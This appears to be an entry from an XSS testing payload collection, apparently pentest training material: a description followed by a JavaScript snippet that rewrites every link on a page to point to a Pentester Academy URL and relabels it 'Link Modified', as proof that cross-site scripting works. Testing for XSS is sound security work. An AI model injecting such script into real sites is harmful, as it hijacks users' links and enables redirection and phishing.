Description: // Since <a href tag is used to insert a link/hyperlink in a website, this javascript payload tries to locate the <a tag and change the links within it. If it works, the XSS is present

<script>
var links = document.getElementsByTagName("a");
for (let i = 0; i < links.length; i++)
{
links[i].href = "http://PentesterAcademy.com/topics";  // Set new link target
links[i].innerHTML = "Link Modified";                   // Set new link text
}
</script>
